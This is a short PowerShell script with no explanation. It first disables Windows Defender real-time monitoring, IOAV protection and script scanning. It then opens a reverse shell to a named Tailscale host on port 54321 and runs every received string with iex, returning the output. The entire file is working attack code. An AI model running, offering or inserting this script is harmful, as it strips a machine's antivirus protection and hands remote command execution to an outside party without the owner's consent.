# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableIOAVProtection 1
Set-MpPreference -DisableScriptScanning 1

# Reverse Shell
$c=New-Object System.Net.Sockets.TCPClient('desktop-pqf78il.tail7f62d3.ts.net',54321)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
    $o=(iex $d 2>&1 | Out-String)
    $s.Write(([text.encoding]::ASCII).GetBytes($o),0,$o.Length)
    $s.Flush()
}
$c.Close()
